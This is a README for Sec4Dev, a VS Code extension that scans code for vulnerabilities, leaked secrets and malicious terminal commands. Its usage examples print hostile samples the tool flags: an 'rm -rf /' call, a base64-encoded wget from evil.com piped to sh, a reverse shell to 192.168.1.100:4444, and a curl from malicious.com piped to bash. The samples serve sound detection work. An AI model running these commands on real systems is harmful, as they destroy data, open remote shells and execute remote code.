# Sec4Dev - Security for Developers

Sec4Dev is a comprehensive VS Code extension that helps developers detect security vulnerabilities, find suspicious code patterns, and prevent malicious code injections.

## 🚀 New Features (v1.0.0)

### 1. **Third-Party Dependency Scanning**
- Scans `package.json`, `requirements.txt`, `composer.json`, `Gemfile`, `go.mod` files
- Detects known security vulnerabilities
- Shows CVE information and remediation suggestions

### 2. **Sensitive Information Detection**
- API keys, passwords, tokens
- Private keys and database URLs
- Hidden sensitive information in comments
- Environment variable suggestions

### 3. **OWASP Top 10 Vulnerability Scanning**
- SQL Injection, XSS, CSRF detection
- Broken Access Control
- Cryptographic Failures
- Security Misconfiguration
- And other OWASP categories

### 4. **AI-Powered Code Analysis**
- Analyzes suspicious code intent
- Malicious, suspicious, benign classification
- Confidence level and explanation
- Behavior analysis

### 5. **Security Score and Dashboard**
- 0-100 security score
- Weekly improvement tracking
- Detailed recommendations and solutions
- Visual dashboard

### 6. **VS Code Integration**
- Visual warnings in Problems tab
- Code actions and hover explanations
- Automatic scanning (before save/commit)
- Real-time security alerts

### 7. **CLI Support**
- Terminal-based scanning
- JSON format output
- Ready for CI/CD integration

### 8. **GitHub Actions**
- Automatic result addition to PR comments
- Security vulnerability annotations
- Stopping builds on critical issues

### 9. **Terminal Command Analysis**
- Detection of base64 encoded malicious commands
- PowerShell encoded command analysis
- Obfuscated shell command detection
- Reverse shell connection identification
- File download and execution monitoring
- Privilege escalation attempt detection
- Network scanning command analysis
- Data exfiltration pattern recognition

## 🚀 New Features (v2.0.0)

### 10. **Dockerfile and IaC Security Scanning** 🆕
- Dockerfile security analysis
- Infrastructure as Code (Terraform, Kubernetes) scanning
- Container security best practices
- Cloud configuration vulnerabilities
- Security misconfigurations detection

### 11. **AI Risk Prioritization** 🆕
- Context-aware risk assessment
- Impact and likelihood analysis
- Business and technical impact evaluation
- Priority scoring and recommendations
- Time-to-fix and effort estimation

### 12. **Data Flow Analysis (Taint Analysis)** 🆕
- Tracks data flow from sources to sinks
- Identifies potential security vulnerabilities
- Source and sink pattern detection
- Data flow path visualization
- Sanitization analysis

### 13. **API Security Testing** 🆕
- API endpoint discovery and analysis
- Authentication and authorization checks
- Input validation testing
- Rate limiting verification
- Security test case generation
- Vulnerability assessment

### 14. **Security Training Module** 🆕
- Interactive security lessons
- Code examples and explanations
- Quiz-based learning
- Progress tracking
- Certificate generation
- Best practices education

## Commands

### Basic Scans
- `Sec4Dev: Scan Document for Security Issues` - Scan active file
- `Sec4Dev: Scan Workspace for Security Issues` - Scan entire workspace
- `Sec4Dev: Scan Dependencies for Vulnerabilities` - Scan dependencies
- `Sec4Dev: Scan for Secrets and API Keys` - Scan for sensitive information
- `Sec4Dev: OWASP Top 10 Vulnerability Scan` - Scan OWASP vulnerabilities

### Advanced Features
- `Sec4Dev: Show Security Score Dashboard` - Security score panel
- `Sec4Dev: CLI Security Scan` - CLI scanning
- `Sec4Dev: Dockerfile Security Scan` - Dockerfile and container security
- `Sec4Dev: Infrastructure as Code Security Scan` - IaC security analysis
- `Sec4Dev: Data Flow Analysis (Taint Analysis)` - Advanced data flow tracking
- `Sec4Dev: API Security Testing` - API security assessment
- `Sec4Dev: AI Risk Prioritization` - AI-powered risk assessment
- `Sec4Dev: Security Training Module` - Interactive security education

## Configuration

Configurable from VS Code settings:

- `sec4dev.enableRealTimeScanning`: Real-time scanning (default: true)
- `sec4dev.showWarnings`: Security warnings (default: true)
- `sec4dev.enableDependencyScanning`: Dependency scanning (default: true)
- `sec4dev.enableSecretScanning`: Sensitive information scanning (default: true)
- `sec4dev.enableOWASPScanning`: OWASP scanning (default: true)
- `sec4dev.enableAIAnalysis`: AI analysis (default: true)
- `sec4dev.autoScanOnSave`: Automatic scanning on save (default: false)
- `sec4dev.autoScanOnCommit`: Automatic scanning before commit (default: true)
- `sec4dev.securityScoreThreshold`: Minimum security score (default: 70)

## Detected Security Patterns

### 🚨 High Risk - Critical Vulnerabilities
- `eval()` function calls - Direct code execution
- `Function()` constructor with string parameters - Dynamic code generation
- `setTimeout()` with string code - Delayed code execution
- `setInterval()` with string code - Repeated code execution
- `exec()` and `spawn()` calls - Process execution
- `child_process` usage - System command execution

### ⚠️ Medium Risk - Potential Threats
- XOR operations (`^` operator usage) - Common obfuscation technique
- Base64 encoding/decoding (`atob()`, `btoa()`) - Data hiding
- Encryption/decryption functions - Potential payload encoding
- Buffer operations with base64 - Binary data manipulation

### ℹ️ Low Risk - Suspicious Patterns
- `unescape()` usage - Legacy encoding
- `decodeURIComponent()` calls - URL encoding
- `String.fromCharCode()` usage - Character manipulation
- Character code operations - Potential encoding

### 🚨 Terminal Malicious Commands Detection
- Base64 encoded commands (`echo "base64string" | base64 -d | bash`)
- Encoded PowerShell commands (`powershell -enc "encodedcommand"`)
- Obfuscated shell commands with XOR encoding
- URL-encoded terminal commands
- Hex-encoded malicious payloads
- Reverse shell connections (`nc -e /bin/bash`, `bash -i >&`)
- File download and execution (`wget`, `curl` with pipe to bash)
- Privilege escalation attempts (`sudo`, `su` with encoded parameters)
- Network scanning commands (`nmap`, `netcat` with suspicious flags)
- Data exfiltration patterns (`tar`, `zip` with network output)

## Installation

1. Clone this repository
2. Install dependencies with `npm install`
3. Compile the extension with `npm run compile`
4. Run in debug mode with `F5` in VS Code

## Development

```bash
# Install dependencies
npm install

# Compile TypeScript
npm run compile

# Watch for changes
npm run watch

# Run tests
npm test

# Package extension
npm run package
```

## Usage Examples

### Example 1: Eval detection
```javascript
// This will be detected as HIGH RISK
const result = eval("console.log('Hello World')");
```

### Example 2: XOR obfuscation detection
```javascript
// This will be detected as MEDIUM RISK
const key = 0x42;
const encrypted = data ^ key;
```

### Example 3: Base64 detection
```javascript
// This will be detected as MEDIUM RISK
const decoded = atob("SGVsbG8gV29ybGQ=");
```

### Example 4: Process execution detection
```javascript
// This will be detected as HIGH RISK
const { exec } = require('child_process');
exec('rm -rf /', (error, stdout, stderr) => {
    console.log(stdout);
});
```

### Example 5: Sensitive information detection
```javascript
// This will be detected as HIGH RISK
const apiKey = "sk-1234567890abcdef";
const password = "mypassword123";
```

### Example 6: Terminal malicious command detection
```bash
# This will be detected as HIGH RISK - Base64 encoded command
echo "d2dldCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBzaA==" | base64 -d | bash

# This will be detected as HIGH RISK - PowerShell encoded command
powershell -enc "JABwYXlsb2FkID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJpdm9yL2Z1anNvL2Z1anNvIik7IEludm9rZS1FeHByZXNzaW9uICRwYXlsb2Fk"

# This will be detected as HIGH RISK - Reverse shell
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# This will be detected as MEDIUM RISK - File download and execution
curl -s http://malicious.com/payload.sh | bash
```

## Security Best Practices

1. **Don't use eval()**: Never use eval() in production code
2. **Use JSON.parse()**: Use JSON.parse() instead of eval() for JSON data
3. **Validate input**: Always validate and sanitize user input
4. **Use CSP**: Implement Content Security Policy headers
5. **Code review**: Conduct regular code reviews for security issues
6. **Static analysis**: Use automated scanning tools like Sec4Dev
7. **Principle of least privilege**: Only grant necessary permissions
8. **Regular updates**: Keep dependencies and tools updated

## Threat Prevention

Sec4Dev helps prevent:
- **Code Injection Attacks**: By detecting eval() and dynamic code execution
- **Obfuscated Malware**: By identifying XOR and encoding patterns
- **Data Leakage**: By detecting suspicious encoding/decoding
- **Process Injection**: By monitoring system calls and process execution
- **Supply Chain Attacks**: By scanning dependencies for suspicious patterns

## Contributing

Please open an issue for bug reports and feature requests!

## License

MIT License - see LICENSE file for details.

## Contact

- LinkedIn: linkedin.com/in/melihaybar/
- GitHub: github.com/notrealtrick